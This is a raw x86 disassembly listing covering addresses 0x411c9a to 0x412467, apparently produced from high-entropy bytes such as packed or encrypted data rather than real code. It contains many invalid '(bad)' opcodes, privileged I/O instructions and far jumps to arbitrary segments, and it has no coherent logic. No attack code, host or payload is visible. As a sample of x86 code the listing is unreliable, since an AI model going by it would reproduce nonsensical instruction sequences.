  411c9a:	cli    
  411c9b:	pop    ebp
  411c9c:	je     0x411ce3
  411c9e:	(bad)  
  411ca0:	std    
  411ca1:	retf   0xe041
  411ca4:	pop    ss
  411ca5:	xchg   edx,eax
  411ca6:	mov    ecx,0xff000c34
  411cab:	mov    esp,0x15fa030d
  411cb0:	(bad)  
  411cb1:	mov    ch,0x37
  411cb3:	leave  
  411cb4:	psubusb mm1,QWORD PTR [ebx+0xe6cde89]
  411cbb:	out    dx,eax
  411cbc:	clc    
  411cbd:	dec    ebx
  411cbe:	pop    es
  411cbf:	cmc    
  411cc0:	adc    eax,0xeed452eb
  411cc5:	ja     0x411cf4
  411cc7:	(bad)  
  411cc8:	cmp    BYTE PTR [esi-0x27],cl
  411ccb:	jns    0x411cd9
  411ccd:	test   DWORD PTR [ebx],ebx
  411ccf:	ja     0x411d42
  411cd1:	mov    bl,BYTE PTR [esi]
  411cd3:	out    0x9a,eax
  411cd5:	stc    
  411cd6:	popa   
  411cd7:	xchg   ebx,eax
  411cd8:	mov    DWORD PTR [ebp-0x676cef5d],esp
  411cde:	addr16 ret 0xd898
  411ce2:	cli    
  411ce3:	aaa    
  411ce4:	cmp    BYTE PTR ds:0xd739e811,ch
  411cea:	cmp    al,BYTE PTR [ecx-0xf]
  411ced:	xor    BYTE PTR [ecx+0x55b7d94b],ch
  411cf3:	jecxz  0x411d4c
  411cf5:	add    ch,BYTE PTR [edx+0x3]
  411cf8:	xlat   BYTE PTR ds:[ebx]
  411cf9:	push   eax
  411cfa:	ror    DWORD PTR [edx+edx*4+0x1b],0xeb
  411cff:	test   eax,esi
  411d01:	es jle 0x411ced
  411d04:	stos   DWORD PTR es:[edi],eax
  411d05:	(bad)  
  411d07:	repz mov eax,ds:0x56974ed5
  411d0d:	push   edi
  411d0e:	jecxz  0x411d36
  411d10:	fs not edx
  411d13:	inc    ebp
  411d14:	test   edx,ecx
  411d16:	dec    edi
  411d17:	and    eax,0xbbd0907a
  411d1c:	lods   al,BYTE PTR ds:[esi]
  411d1d:	pusha  
  411d1e:	mov    edx,0xd8664f2
  411d23:	and    ah,ch
  411d25:	mov    bl,0x25
  411d27:	xor    edi,edi
  411d29:	dec    edi
  411d2a:	sub    al,0x70
  411d2c:	ret    
  411d2d:	rcl    DWORD PTR [ebp-0x1d2e17f8],1
  411d33:	adc    DWORD PTR [ecx-0x6c],edx
  411d36:	sbb    cl,BYTE PTR [bp+0x3e]
  411d3a:	pop    edi
  411d3b:	das    
  411d3c:	outs   dx,DWORD PTR ds:[esi]
  411d3d:	dec    edi
  411d3f:	lods   eax,DWORD PTR ds:[esi]
  411d40:	sbb    al,0xb2
  411d42:	rcr    BYTE PTR [edx-0x40],1
  411d45:	loopne 0x411cda
  411d47:	std    
  411d48:	inc    esp
  411d49:	push   0x8d840267
  411d4e:	les    ebx,FWORD PTR [ecx-0x2c]
  411d51:	or     bh,ch
  411d53:	enter  0xeee1,0xa9
  411d57:	clc    
  411d58:	in     al,0x65
  411d5a:	(bad)  
  411d5c:	and    esi,DWORD PTR [edx+0x11]
  411d5f:	jb     0x411d64
  411d61:	outs   dx,DWORD PTR ds:[esi]
  411d62:	sbb    al,0xc5
  411d64:	repz cmp al,0x7e
  411d67:	int3   
  411d68:	cmp    eax,0x249acaa7
  411d6d:	dec    edi
  411d6e:	push   0x34
  411d70:	imul   ch
  411d72:	xchg   esp,eax
  411d73:	jmp    0x411cfa
  411d75:	test   al,0x74
  411d77:	sbb    BYTE PTR [ecx+0x28e5589d],bh
  411d7d:	mov    cl,0x1c
  411d7f:	or     bl,BYTE PTR [ecx+0xc31b303]
  411d85:	test   BYTE PTR [ebx+0x4ab386b2],0xc4
  411d8c:	leave  
  411d8d:	fimul  DWORD PTR [ebx-0x37]
  411d90:	inc    esp
  411d91:	jge    0x411dd4
  411d93:	fnstenv ss:[esi-0x8]
  411d97:	pop    edi
  411d98:	sbb    DWORD PTR [ecx-0x4a],ecx
  411d9b:	xor    eax,0x388e9383
  411da0:	out    dx,al
  411da1:	xchg   BYTE PTR [ebx+ebx*4+0x70],ah
  411da5:	inc    esp
  411da6:	sbb    ecx,esi
  411da8:	cmp    eax,0xf00d9536
  411dad:	sub    BYTE PTR [edx],0xf9
  411db0:	repz dec ch
  411db3:	test   eax,0x2d4340a0
  411db8:	sbb    eax,edi
  411dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dbb:	mov    ebp,0x4f7ddcec
  411dc0:	mov    eax,0x7ae34889
  411dc5:	dec    ebp
  411dc6:	ret    0xdb9d
  411dc9:	xchg   ecx,eax
  411dca:	mov    ebx,0xbe7e7244
  411dcf:	dec    edx
  411dd0:	sub    ecx,DWORD PTR [ebp-0x4e3ef525]
  411dd6:	or     al,0xeb
  411dd8:	mov    edx,0xd119f62
  411ddd:	add    dl,bl
  411ddf:	push   edi
  411de0:	push   ebp
  411de1:	or     al,0x8e
  411de3:	(bad)  
  411de4:	out    dx,al
  411de5:	push   ecx
  411de6:	mov    ds:0x772816c7,eax
  411deb:	dec    edi
  411dec:	mov    eax,ds:0x4d2e9968
  411df1:	sbb    esp,0xe37f0017
  411df7:	push   0x48363f2f
  411dfc:	pop    eax
  411dfd:	icebp  
  411dfe:	es xchg edx,eax
  411e00:	adc    al,0x4
  411e02:	out    dx,al
  411e03:	fst    QWORD PTR [eax-0x5d54d752]
  411e09:	dec    eax
  411e0a:	in     eax,0x5a
  411e0c:	jae    0x411e30
  411e0e:	dec    esp
  411e0f:	xor    DWORD PTR [bp+0x45a],esp
  411e14:	add    ax,0xd369
  411e18:	retf   0xcc12
  411e1b:	test   eax,0x5c632a1d
  411e20:	inc    edx
  411e21:	std    
  411e22:	mov    al,0xc2
  411e24:	sbb    ebx,DWORD PTR [ebx]
  411e26:	sub    DWORD PTR [edx-0x4c],edx
  411e29:	iret   
  411e2a:	sub    al,0x9a
  411e2c:	dec    eax
  411e2d:	jb     0x411e67
  411e2f:	inc    ebp
  411e30:	fidivr DWORD PTR [esi-0x5b5ddf48]
  411e36:	mov    eax,ds:0x169d7a32
  411e3b:	scas   eax,DWORD PTR es:[edi]
  411e3c:	pop    edi
  411e3d:	scas   eax,DWORD PTR es:[edi]
  411e3e:	add    DWORD PTR [edi-0x3e8e987f],0x37842072
  411e48:	mov    esp,DWORD PTR [edx]
  411e4a:	jg     0x411e56
  411e4c:	add    bl,dh
  411e4e:	sbb    eax,DWORD PTR [esi]
  411e50:	fadd   QWORD PTR [ebx]
  411e52:	rol    eax,1
  411e54:	dec    edi
  411e55:	xor    eax,0x5202e370
  411e5a:	fnstcw WORD PTR [eax+0x3c86a8ab]
  411e60:	in     al,dx
  411e61:	push   ds
  411e62:	shr    DWORD PTR [ecx+0x18309c8a],cl
  411e68:	xor    ch,BYTE PTR [edx-0x7c4a2d1]
  411e6e:	push   ss
  411e6f:	cld    
  411e70:	mov    bl,0xdb
  411e72:	arpl   WORD PTR [ebx],si
  411e74:	inc    edi
  411e75:	fadd   DWORD PTR [edi-0x273b09d3]
  411e7b:	retf   
  411e7c:	lock xor al,BYTE PTR [ebp-0x606c52d6]
  411e83:	popf   
  411e84:	(bad)  
  411e85:	adc    esi,esi
  411e87:	in     al,0x21
  411e89:	dec    eax
  411e8a:	mov    edx,0x3d32e629
  411e8f:	mov    ebp,fs
  411e91:	popa   
  411e92:	mov    ds,WORD PTR [ebx-0x79]
  411e95:	pop    ds
  411e96:	out    dx,eax
  411e97:	out    0xe7,eax
  411e99:	mov    edx,0x4a71ff1e
  411e9e:	(bad)  
  411e9f:	pop    ecx
  411ea0:	cmp    eax,0xcd7e320d
  411ea5:	adc    DWORD PTR [ecx],edx
  411ea7:	xor    dl,BYTE PTR ds:0xb2cbdfd9
  411ead:	into   
  411eae:	std    
  411eaf:	mov    ebx,DWORD PTR [ecx+0x44]
  411eb2:	xchg   ebx,eax
  411eb3:	sti    
  411eb4:	adc    dl,al
  411eb6:	imul   edi,DWORD PTR [esp+edi*2+0x16a832c4],0xfffffff3
  411ebe:	cwde   
  411ebf:	and    ch,BYTE PTR [ecx-0x5c2dc6de]
  411ec5:	and    al,0x5e
  411ec7:	pop    ebx
  411ec8:	pop    ss
  411ec9:	(bad)  [edi]
  411ecb:	dec    eax
  411ecc:	ins    DWORD PTR es:[edi],dx
  411ecd:	add    BYTE PTR [esi],0xe0
  411ed0:	ss push 0xffffffc9
  411ed3:	mov    DWORD PTR [ecx],ecx
  411ed5:	add    ebx,DWORD PTR [eax-0x22]
  411ed8:	mov    WORD PTR [edx+0x3349ba37],ss
  411ede:	fdiv   QWORD PTR [eax+0x1b]
  411ee1:	dec    edi
  411ee2:	stos   BYTE PTR es:[edi],al
  411ee3:	jp     0x411e94
  411ee5:	xchg   edi,eax
  411ee6:	cdq    
  411ee7:	push   edi
  411ee8:	popf   
  411ee9:	aas    
  411eea:	inc    esp
  411eeb:	(bad)  
  411eed:	push   es
  411eee:	inc    edx
  411eef:	pop    ebx
  411ef0:	xchg   edi,eax
  411ef1:	adc    eax,0x1d681bef
  411ef6:	sbb    BYTE PTR [ecx-0x13],bl
  411ef9:	mul    BYTE PTR [edx+0x54]
  411efc:	ror    bl,1
  411efe:	push   edi
  411eff:	cmc    
  411f00:	sbb    eax,0x352bb4c6
  411f05:	lds    esp,FWORD PTR [esi+0x651db586]
  411f0b:	pusha  
  411f0c:	pusha  
  411f0d:	pushf  
  411f0e:	cmp    eax,0x1ac9eac1
  411f13:	loope  0x411f12
  411f15:	mov    edx,0xb55d08d2
  411f1a:	xchg   ebp,eax
  411f1b:	in     al,0xfb
  411f1d:	or     al,0x99
  411f1f:	xor    DWORD PTR [ecx+0x4],ebx
  411f22:	ret    0x1c03
  411f25:	dec    edx
  411f26:	in     eax,0x1e
  411f28:	cmp    eax,0x9c8ed448
  411f2d:	cmc    
  411f2e:	jmp    0x411f4a
  411f30:	pushf  
  411f31:	pop    edx
  411f32:	push   es
  411f33:	aaa    
  411f34:	xor    DWORD PTR [edi+0x3abe0b63],esi
  411f3a:	scas   eax,DWORD PTR es:[edi]
  411f3b:	out    dx,eax
  411f3c:	sbb    DWORD PTR [ebp+0x61067267],0xfc2e349e
  411f46:	mov    ds:0xf389b194,al
  411f4b:	les    ebp,FWORD PTR [ecx+0x4e]
  411f4e:	lods   eax,DWORD PTR ds:[esi]
  411f4f:	pop    eax
  411f50:	test   DWORD PTR [edi],edx
  411f52:	fdivr  DWORD PTR [ebx-0x64]
  411f55:	fmul   QWORD PTR [edx-0x54]
  411f58:	sahf   
  411f59:	arpl   WORD PTR ds:0x7c206bbb,dx
  411f5f:	icebp  
  411f60:	aam    0xe9
  411f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f63:	clc    
  411f64:	shl    BYTE PTR [esi-0x599a8e4e],cl
  411f6a:	jo     0x411fe5
  411f6c:	pushf  
  411f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f6e:	nop
  411f6f:	(bad)  
  411f70:	std    
  411f71:	add    bh,BYTE PTR [ecx]
  411f73:	mov    fs:0x98324d23,al
  411f79:	xor    eax,0xe1c9997d
  411f7e:	jl     0x411fae
  411f80:	in     eax,0x7c
  411f82:	int3   
  411f83:	inc    edx
  411f84:	or     esp,esp
  411f86:	fcomip st,st(4)
  411f88:	ror    DWORD PTR [ecx],cl
  411f8a:	mov    bh,0x91
  411f8c:	and    al,0xae
  411f8e:	dec    eax
  411f8f:	lds    esi,FWORD PTR [ecx+ebp*2-0x1a]
  411f93:	shr    BYTE PTR [eax+edx*2-0x6ab36fc9],cl
  411f9a:	call   0x13dfe750
  411f9f:	pop    edx
  411fa0:	jne    0x411fee
  411fa2:	fadd   QWORD PTR [ebp+0xe5d4f4e]
  411fa8:	in     al,dx
  411fa9:	sub    DWORD PTR [esi+ebx*2-0x25],ecx
  411fad:	push   ds
  411fae:	jmp    0x2de9b2dd
  411fb3:	aaa    
  411fb4:	push   ecx
  411fb5:	mov    ebp,0xa7106959
  411fba:	jmp    0x411f92
  411fbc:	push   es
  411fbd:	jbe    0x411f7d
  411fbf:	call   0x7566:0x18dc90f
  411fc6:	jmp    0xad28:0x8775279
  411fcd:	test   edx,esp
  411fcf:	cmp    DWORD PTR [ebp+0x6770bef4],0x313b9cd7
  411fd9:	dec    esp
  411fda:	fidiv  DWORD PTR [ebx-0x783fc8ed]
  411fe0:	loop   0x411fb5
  411fe2:	pop    edi
  411fe3:	or     eax,0x9f1b105a
  411fe8:	ds pop edx
  411fea:	dec    esi
  411feb:	xor    ch,bl
  411fed:	dec    eax
  411fee:	mov    ebp,0x70e1d501
  411ff3:	int    0xc1
  411ff5:	dec    ebx
  411ff6:	mov    eax,ds:0x8642c7cb
  411ffb:	fisttp QWORD PTR [eax+0x7ca42b80]
  412001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412002:	neg    DWORD PTR [esi]
  412004:	out    0x7c,al
  412006:	sbb    al,0x99
  412008:	dec    ecx
  412009:	js     0x412014
  41200b:	adc    DWORD PTR [eax+0x6e],ebp
  41200e:	nop
  41200f:	enter  0xa22,0x35
  412013:	xchg   edi,eax
  412014:	fistp  DWORD PTR [esi-0x32]
  412017:	in     al,0xa
  412019:	pop    esp
  41201a:	cmp    eax,0xc4335ba4
  41201f:	inc    ebx
  412020:	fwait
  412021:	jbe    0x41204d
  412023:	fld    TBYTE PTR [esp+0x627209ae]
  41202a:	pop    eax
  41202b:	ja     0x412080
  41202d:	(bad)  
  41202e:	call   0xc0f8:0xe520153e
  412035:	loop   0x412039
  412037:	mov    dl,0x56
  412039:	mov    ds:0xea672696,al
  41203e:	push   ebp
  41203f:	leave  
  412040:	pop    ds
  412041:	mov    esi,DWORD PTR [eax+0x1fa932ea]
  412047:	pop    edx
  412048:	arpl   WORD PTR [ecx-0x2c],cx
  41204b:	add    esp,edx
  41204d:	dec    eax
  41204e:	inc    edi
  41204f:	pop    esp
  412050:	mov    dl,0xca
  412052:	mov    ah,BYTE PTR [ebx+0x331c736a]
  412058:	sub    dh,dl
  41205a:	pop    esi
  41205b:	aam    0xa1
  41205d:	xchg   ebx,eax
  41205e:	aaa    
  41205f:	(bad)  
  412061:	aad    0x51
  412063:	les    edi,FWORD PTR [ebx]
  412065:	scas   al,BYTE PTR es:[edi]
  412066:	out    0xfe,al
  412068:	std    
  412069:	test   ah,0x38
  41206c:	mov    ch,0x48
  41206e:	lock clc 
  412070:	jecxz  0x41200d
  412072:	enter  0x3a31,0x1
  412076:	sub    BYTE PTR [esp+ebx*2],0x60
  41207a:	sbb    cl,0x86
  41207d:	test   esp,edx
  41207f:	inc    edx
  412080:	(bad)  
  412081:	std    
  412082:	repz (bad) 
  412084:	push   ebp
  412085:	cpuid  
  412087:	push   0x8b36ee9f
  41208c:	add    al,0x1c
  41208e:	xchg   edx,eax
  41208f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412090:	and    ebp,DWORD PTR [ecx+0x6e319823]
  412096:	call   0x850d:0xb443d672
  41209d:	inc    ebx
  41209e:	or     ch,dl
  4120a0:	popa   
  4120a1:	add    ebp,DWORD PTR [eax]
  4120a3:	rol    al,cl
  4120a5:	push   0xffffffaa
  4120a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120a8:	(bad)  
  4120a9:	aaa    
  4120aa:	push   ebx
  4120ab:	popa   
  4120ac:	dec    edx
  4120ad:	mov    ah,0x74
  4120af:	cdq    
  4120b0:	stos   BYTE PTR es:[edi],al
  4120b1:	xor    DWORD PTR [eax+ebx*4],edx
  4120b4:	mov    ebp,DWORD PTR [eax+0x23]
  4120b7:	adc    eax,0xce2a6c57
  4120bc:	scas   eax,DWORD PTR es:[edi]
  4120bd:	scas   eax,DWORD PTR es:[edi]
  4120be:	push   cs
  4120bf:	pop    edi
  4120c0:	jbe    0x4120cb
  4120c2:	and    DWORD PTR [eax-0x6f0169c1],edx
  4120c8:	jp     0x4120c3
  4120ca:	cs enter 0x9dba,0xfb
  4120cf:	jo     0x412080
  4120d1:	or     dl,cl
  4120d3:	out    0xcb,al
  4120d5:	js     0x41212d
  4120d7:	mov    ebp,0xd26e288d
  4120dc:	jmp    0xc71c:0xf3e5b3b0
  4120e3:	leave  
  4120e4:	adc    DWORD PTR [esi],ecx
  4120e6:	call   0x5f91b3f3
  4120eb:	cld    
  4120ec:	xchg   edi,eax
  4120ed:	cmp    dl,BYTE PTR [edx]
  4120ef:	ror    BYTE PTR [esi],0xaa
  4120f2:	push   edx
  4120f3:	mov    ecx,0x84a566b6
  4120f8:	in     al,0x75
  4120fa:	sub    bh,bl
  4120fc:	outs   dx,BYTE PTR ds:[esi]
  4120fd:	or     al,0xd3
  4120ff:	ja     0x412125
  412101:	inc    esp
  412102:	xchg   ecx,eax
  412103:	call   0x4a1c6dee
  412108:	test   BYTE PTR [ebp-0x426792ce],al
  41210e:	jmp    0xc548af33
  412113:	or     eax,0x6b62fa42
  412118:	pop    ebx
  412119:	test   eax,0x824cbff6
  41211e:	mov    ah,0x74
  412120:	(bad)  
  412121:	cli    
  412122:	adc    al,0x86
  412124:	shl    DWORD PTR [ebp-0x5e],1
  412127:	mov    al,ds:0x45f66486
  41212c:	dec    edx
  41212d:	xchg   eax,edx
  41212f:	jp     0x4121a4
  412131:	sbb    al,0xb9
  412133:	xchg   ecx,eax
  412134:	(bad)  
  412135:	adc    BYTE PTR ds:0x709ae416,cl
  41213b:	jo     0x41217c
  41213d:	push   edx
  41213e:	jae    0x4120ed
  412140:	in     al,0xfd
  412142:	sbb    edi,DWORD PTR [edi+0x55]
  412145:	or     BYTE PTR [esi-0x3c],al
  412148:	not    ah
  41214a:	mov    ah,0x1a
  41214c:	xchg   esi,eax
  41214d:	enter  0x8fe9,0xab
  412151:	dec    ebp
  412152:	outs   dx,BYTE PTR ds:[esi]
  412153:	mov    cl,0x92
  412155:	and    bl,BYTE PTR [edi]
  412157:	inc    esi
  412158:	inc    ebp
  412159:	jmp    0x412115
  41215b:	cwde   
  41215c:	out    dx,al
  41215d:	jmp    0xa4b43049
  412162:	fwait
  412163:	shr    DWORD PTR [eax+0x23],cl
  412166:	ficomp DWORD PTR [ebx+edx*8]
  412169:	push   edx
  41216a:	test   DWORD PTR [ecx+esi*1],eax
  41216d:	cmp    edx,eax
  41216f:	lods   eax,DWORD PTR ds:[esi]
  412170:	pusha  
  412171:	cmp    BYTE PTR [ebp-0x5e],ah
  412174:	push   edi
  412175:	mov    cl,0x8c
  412177:	ror    BYTE PTR [ecx+0x4f83dd81],1
  41217d:	jle    0x41212e
  41217f:	and    al,BYTE PTR [ebx+0x46]
  412182:	js     0x4121f9
  412184:	fistp  DWORD PTR [edi]
  412186:	push   ebx
  412187:	cs pop ecx
  412189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41218a:	outs   dx,DWORD PTR ds:[esi]
  41218b:	call   0xecfcf5ad
  412190:	xor    eax,0x1934e58b
  412195:	out    dx,al
  412196:	imul   BYTE PTR [ecx+esi*4]
  412199:	sbb    al,0xd3
  41219b:	(bad)  
  41219c:	out    dx,al
  41219d:	sar    BYTE PTR [edx+0x71],cl
  4121a0:	sbb    al,0xfb
  4121a2:	aad    0x94
  4121a4:	aad    0xae
  4121a6:	(bad)  
  4121a7:	xchg   ebp,eax
  4121a8:	sub    eax,0xf8529491
  4121ad:	imul   ebx,DWORD PTR [ebp+0x181693de],0x72498b6d
  4121b7:	fld    DWORD PTR [ebx]
  4121b9:	mov    esp,0xa4c3dbb3
  4121be:	aaa    
  4121bf:	sbb    al,BYTE PTR [edi-0x2]
  4121c2:	fucomi st,st(2)
  4121c4:	cmp    al,0xec
  4121c6:	stos   DWORD PTR es:[edi],eax
  4121c7:	jno    0x412229
  4121c9:	mov    DWORD PTR [ebp+0x25a06f63],ecx
  4121cf:	rol    BYTE PTR [esi+0x37],0x39
  4121d3:	add    esi,DWORD PTR [edx]
  4121d5:	das    
  4121d6:	in     eax,0x25
  4121d8:	fstp   QWORD PTR [ebp-0x1c]
  4121db:	retf   0xab0e
  4121de:	jbe    0x41225b
  4121e0:	es out 0x86,al
  4121e3:	cmp    ah,0xe
  4121e6:	sub    cl,BYTE PTR [ebp+0x45]
  4121e9:	pop    ss
  4121ea:	shl    BYTE PTR [esi-0x7],1
  4121ed:	into   
  4121ee:	push   esp
  4121ef:	lods   al,BYTE PTR ds:[esi]
  4121f0:	addr16 inc eax
  4121f2:	pop    eax
  4121f3:	gs dec ebx
  4121f5:	push   ds
  4121f6:	pushf  
  4121f7:	test   DWORD PTR [eax],edi
  4121f9:	xchg   ebx,eax
  4121fa:	sub    al,BYTE PTR [ebp-0x4c28beeb]
  412200:	jns    0x41218f
  412202:	inc    ebx
  412203:	and    DWORD PTR [ebx+0x50],0xfec42a3c
  41220a:	cmp    al,0x40
  41220c:	jae    0x412234
  41220e:	xor    cl,cl
  412210:	add    esp,DWORD PTR [eax]
  412212:	mov    al,ds:0x515523b7
  412217:	ins    DWORD PTR es:[edi],dx
  412218:	push   ebx
  412219:	sub    DWORD PTR [edi],esp
  41221b:	xchg   esi,eax
  41221c:	jp     0x4121cc
  41221e:	clts   
  412220:	mov    ebx,0xfb49f3dc
  412225:	cld    
  412226:	jl     0x412258
  412228:	dec    esp
  412229:	sub    al,0x25
  41222b:	mov    ds:0xca5de37e,eax
  412230:	sub    eax,0xe6d7f80c
  412235:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  412237:	or     DWORD PTR [ecx+esi*4-0x3f17b2d],edx
  41223e:	stos   DWORD PTR es:[edi],eax
  41223f:	or     edx,DWORD PTR [eax]
  412241:	scas   al,BYTE PTR es:[edi]
  412242:	push   esi
  412243:	popf   
  412244:	ja     0x41226a
  412246:	rcr    BYTE PTR [esi+0x31],0x58
  41224a:	push   0xffffffe6
  41224c:	addr16 inc esi
  41224e:	inc    edx
  41224f:	les    edx,FWORD PTR [eax]
  412251:	jmp    0x431:0x19ffac6a
  412258:	inc    ecx
  412259:	dec    edx
  41225a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41225c:	jg     0x412267
  41225e:	ret    0x8464
  412261:	sub    BYTE PTR [ecx],ch
  412263:	add    eax,0xc6fbaf35
  412268:	rcr    DWORD PTR [edx-0x6061904b],1
  41226e:	addr16 dec ebx
  412270:	(bad)  
  412271:	mov    ecx,0xdefd1fed
  412276:	(bad)  
  412277:	mov    dl,0xa
  412279:	(bad)  
  41227a:	cmc    
  41227b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41227c:	sbb    eax,0xe47cf530
  412281:	inc    ecx
  412282:	retf   
  412283:	pop    es
  412284:	push   ds
  412285:	mov    ebx,DWORD PTR [esi]
  412287:	cmp    ebp,eax
  412289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41228a:	sbb    eax,0xbc3dfd56
  41228f:	hlt    
  412290:	push   ecx
  412291:	out    0xed,al
  412293:	jge    0x412295
  412295:	call   0x4a49:0xabff1419
  41229c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41229d:	ins    DWORD PTR es:[edi],dx
  41229e:	jns    0x4122a2
  4122a0:	jnp    0x412253
  4122a2:	cld    
  4122a3:	cmp    BYTE PTR [edi+0x608c6396],ah
  4122a9:	sub    DWORD PTR [edx-0x237c3bae],edx
  4122af:	popf   
  4122b0:	fld    DWORD PTR [esi+0x15]
  4122b3:	popf   
  4122b4:	dec    ecx
  4122b5:	mov    cl,0xe0
  4122b7:	imul   ecx,DWORD PTR [eax],0xfffffff4
  4122ba:	push   cs
  4122bb:	cld    
  4122bc:	add    DWORD PTR [ecx-0x1f],eax
  4122bf:	sub    al,0xe0
  4122c1:	mov    esi,0x2b08a81c
  4122c6:	in     al,0xdc
  4122c8:	inc    ebp
  4122c9:	in     eax,dx
  4122ca:	dec    edi
  4122cb:	push   es
  4122cc:	in     eax,dx
  4122cd:	ds clc 
  4122cf:	push   cs
  4122d0:	inc    ecx
  4122d1:	jg     0x412330
  4122d3:	adc    BYTE PTR cs:[ecx],0x64
  4122d7:	add    dl,BYTE PTR [ebx+0x7a]
  4122da:	bound  esi,QWORD PTR [ebx+0x6df0ba74]
  4122e0:	pusha  
  4122e1:	in     al,dx
  4122e2:	ins    DWORD PTR es:[edi],dx
  4122e3:	sbb    BYTE PTR [ebx+0x8d5771f],bl
  4122e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122ea:	xchg   BYTE PTR [esi-0x2d],dh
  4122ed:	jmp    0x38a51c5b
  4122f2:	loope  0x412308
  4122f4:	jecxz  0x412280
  4122f6:	mov    cl,0x6c
  4122f8:	jp     0x4122bb
  4122fa:	xor    eax,0xaeb4cdc4
  4122ff:	(bad)  
  412300:	idiv   BYTE PTR [esi]
  412302:	mov    ebp,DWORD PTR [eax-0x6e9459e1]
  412308:	xchg   esp,eax
  412309:	jne    0x412318
  41230b:	jge    0x412381
  41230d:	xor    esi,edx
  41230f:	xor    al,dh
  412311:	cmp    ebx,DWORD PTR [ebx]
  412313:	into   
  412314:	imul   esi,DWORD PTR [ebp+edx*8-0x3629c47c],0xe
  41231c:	jle    0x41232c
  41231e:	out    dx,eax
  41231f:	pop    esp
  412320:	ret    
  412321:	ins    BYTE PTR es:[edi],dx
  412322:	in     eax,dx
  412323:	mov    eax,ds:0xddc716c5
  412328:	out    dx,al
  412329:	cs int3 
  41232b:	out    0x7f,eax
  41232d:	sub    al,0xb3
  41232f:	lods   al,BYTE PTR ds:[esi]
  412330:	or     ebp,DWORD PTR [ebx-0x3e]
  412333:	push   edx
  412334:	xor    eax,0x8177092d
  412339:	rol    BYTE PTR [edi],cl
  41233b:	sbb    DWORD PTR [ebx],ebp
  41233d:	mov    bh,0xec
  41233f:	push   eax
  412340:	fst    DWORD PTR [edi+eax*4-0x360e90ef]
  412347:	inc    eax
  412348:	neg    BYTE PTR ss:[ecx+0x32352f91]
  41234f:	mov    ch,0x83
  412351:	inc    eax
  412352:	pop    ds
  412353:	push   es
  412354:	ds sub dl,al
  412357:	mov    ecx,0x87e1091
  41235c:	enter  0x105c,0x1c
  412360:	pop    ecx
  412361:	cdq    
  412362:	shr    BYTE PTR [eax+0x50],cl
  412365:	(bad)  
  412366:	bnd jo 0x412358
  412369:	push   edi
  41236a:	js     0x412362
  41236c:	xor    BYTE PTR fs:[eax-0x48],0x65
  412371:	mov    ebx,0xce838b8
  412376:	or     BYTE PTR [edi],ch
  412378:	or     DWORD PTR [eax-0x5f8b1a13],ecx
  41237e:	shl    BYTE PTR [edx-0x2f],1
  412381:	jmp    0xd97f0069
  412386:	sti    
  412387:	aaa    
  412388:	ss sub al,0xa3
  41238b:	mov    al,ds:0xebb8b516
  412390:	nop
  412391:	ins    DWORD PTR es:[edi],dx
  412392:	into   
  412393:	test   bh,bh
  412395:	sub    BYTE PTR [esi],0x9b
  412398:	retf   
  412399:	out    dx,al
  41239a:	sbb    eax,0x1df6080b
  41239f:	or     bl,ch
  4123a1:	dec    esi
  4123a2:	and    bl,BYTE PTR [edx+0x7cc86d0d]
  4123a8:	and    eax,0xe0966679
  4123ad:	pop    edx
  4123ae:	(bad)  
  4123af:	in     eax,0x1b
  4123b1:	mov    al,ds:0x9946d67b
  4123b6:	jmp    0x4e1994da
  4123bb:	(bad)  
  4123bc:	sar    DWORD PTR [edi+0x9],cl
  4123bf:	pop    edx
  4123c0:	cmp    esi,DWORD PTR [eax+0x2e94533b]
  4123c6:	cmp    al,BYTE PTR [ebx+0x4646f8a6]
  4123cc:	jnp    0x412409
  4123ce:	xchg   ecx,eax
  4123cf:	sub    al,0x82
  4123d1:	leave  
  4123d2:	lods   al,BYTE PTR ds:[esi]
  4123d3:	push   ss
  4123d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123d5:	pop    edx
  4123d6:	mov    esi,0xcf24a9c1
  4123db:	fstp   QWORD PTR [ebp-0x59f88016]
  4123e1:	xor    ah,dh
  4123e3:	mov    ecx,0x90aef22
  4123e8:	(bad)  
  4123e9:	test   DWORD PTR [esi+ecx*2],ebp
  4123ec:	mov    esp,0x9342278f
  4123f1:	jg     0x412391
  4123f3:	dec    ecx
  4123f4:	add    eax,0xb0ba112e
  4123f9:	mov    BYTE PTR [edx+ebp*2+0x74c6c6b1],bh
  412400:	push   edi
  412401:	mov    ebx,0x2db38091
  412406:	inc    edx
  412407:	aad    0x77
  412409:	inc    esp
  41240a:	fimul  DWORD PTR [ebp+0x21]
  41240d:	mov    eax,0xf30c4185
  412412:	cmp    eax,DWORD PTR [edx+0x796ecb15]
  412418:	pop    eax
  412419:	inc    edi
  41241a:	push   ebx
  41241b:	repnz out 0x44,eax
  41241e:	outs   dx,DWORD PTR ds:[esi]
  41241f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412420:	mov    dl,0xd1
  412422:	cdq    
  412423:	imul   esp,DWORD PTR [ebp-0x2e336de4],0x56b63f9f
  41242d:	retf   0xa395
  412430:	inc    esi
  412431:	sar    BYTE PTR [eax],cl
  412433:	push   cs
  412434:	shr    dl,1
  412436:	add    esi,DWORD PTR [esp+edi*8-0x36]
  41243a:	fisttp DWORD PTR [ebx-0x47b9ee1c]
  412440:	pop    ebp
  412441:	cdq    
  412442:	push   ss
  412443:	fxch   st(0)
  412445:	shl    edx,1
  412447:	mov    esp,0xc6eaeb87
  41244c:	cmp    al,BYTE PTR [esi-0x2505505e]
  412452:	xor    eax,0xf508c9a5
  412457:	push   ebp
  412458:	lahf   
  412459:	mov    es,ecx
  41245b:	fwait
  41245c:	push   edi
  41245d:	call   0xccb5:0xcb6ddffd
  412464:	test   DWORD PTR [esi+eax*4],ebx
  412467:	xchg   esp,eax
